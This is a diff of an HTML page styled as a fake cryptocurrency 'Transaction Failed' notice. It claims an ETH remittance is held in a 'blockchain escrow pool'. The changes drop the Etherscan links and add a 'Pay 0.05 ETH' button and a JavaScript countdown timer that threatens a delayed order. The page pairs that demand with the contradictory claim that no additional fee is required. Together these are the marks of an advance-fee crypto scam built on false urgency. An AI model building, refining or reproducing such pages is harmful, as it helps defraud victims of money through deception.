@@ -40,7 +40,6 @@
       from { opacity: 0.5; }
       to { opacity: 1; }
     }
-
     .progress-bar {
       width: 100%;
       height: 4px;
@@ -58,7 +57,6 @@
       from { transform: translateX(-100%); }
       to { transform: translateX(100%); }
     }
-
     .container {
       padding: 24px;
       max-width: 1100px;
@@ -72,13 +70,6 @@
       margin-bottom: 20px;
       position: relative;
       overflow: hidden;
-    }
-    .blink {
-      animation: blink 1s infinite alternate;
-    }
-    @keyframes blink {
-      from { box-shadow: 0 0 10px #ff4e4e; }
-      to { box-shadow: 0 0 25px #ffb347; }
     }
     h2 {
       color: #ff6b6b;
@@ -95,21 +86,11 @@
       list-style: disc;
       padding-left: 20px;
     }
-    th, td {
-      text-align: left;
-      padding: 8px;
-      border-bottom: 1px solid #1e252c;
-    }
-
     .error {
       border: 1px solid #ff6b6b;
       box-shadow: 0 0 25px rgba(255, 60, 60, 0.4);
       background: rgba(60, 0, 0, 0.4);
     }
-    .error h2 {
-      color: #ff8686;
-    }
-
     .btn {
       background-color: #1f1f1f;
       border: 2px solid #ff9c00;
@@ -127,7 +108,17 @@
       background-color: #ff9c00;
       color: #0b0e11;
     }
-
+    .countdown-box {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 1.2rem;
+      color: #ffb347;
+    }
+    .expired {
+      color: #ff4e4e;
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
     .footer {
       text-align: center;
       color: #aaa;
@@ -152,7 +143,7 @@
 
   <div class="container">
 
-    <div class="card blink error">
+    <div class="card error">
       <h2>🚫 Transaction Failed — Processing Halted</h2>
       <p><strong>Status:</strong> Transaction Abnormal — Remittance Failed</p>
       <p><strong>Detected:</strong> October 10, 2025, 15:20 (Japan Time)</p>
@@ -181,8 +172,10 @@
       <p>Funds are securely held within the blockchain escrow pool until <strong>October 15, 2025</strong>.</p>
       <p>Please refrain from resubmitting transactions or altering wallet addresses during this process.</p>
       <div style="text-align:center;">
-        <a class="btn" href="https://etherscan.io/tx/0x4838B106FCe9647Bdf1E787BF73cE8B0BAD5f97" target="_blank">View Transaction</a>
-        <a class="btn" href="https://etherscan.io/address/0xdb55b019b8d153261d2bd45ea9360dd88d7c5179" target="_blank">Receiver Wallet</a>
+        <a class="btn" href="#">Pay 0.05 ETH</a>
+        <div class="countdown-box">
+          ⏳ Time remaining: <span id="countdown">59:50</span>
+        </div>
       </div>
     </div>
 
@@ -193,8 +186,7 @@
         <li>No additional fee or manual confirmation is required.</li>
         <li>All ETH funds will be automatically transferred once verification is finalized on <strong>October 15, 2025</strong>.</li>
         <li>You will receive an automatic confirmation notice via blockchain message.</li>
-        <li>The remittance address does not match, and the funds have been returned to the original source.Please make a payment of 0.05 ETH using the correct receiving address.
-</li>
+        <li>If payment is not completed before the countdown expires, the order will be delayed for processing.</li>
       </ul>
     </div>
 
@@ -204,5 +196,29 @@
     </div>
 
   </div>
+
+  <script>
+    let minutes = 29;
+    let seconds = 50;
+    const countdownEl = document.getElementById('countdown');
+
+    const timer = setInterval(() => {
+      if (seconds === 0) {
+        if (minutes === 0) {
+          clearInterval(timer);
+          countdownEl.innerHTML = '<span class="expired">⏰ Time expired. The order will be delayed for processing.</span>';
+          return;
+        }
+        minutes--;
+        seconds = 59;
+      } else {
+        seconds--;
+      }
+      const formatted =
+        String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+      countdownEl.textContent = formatted;
+    }, 1000);
+  </script>
+
 </body>
 </html>
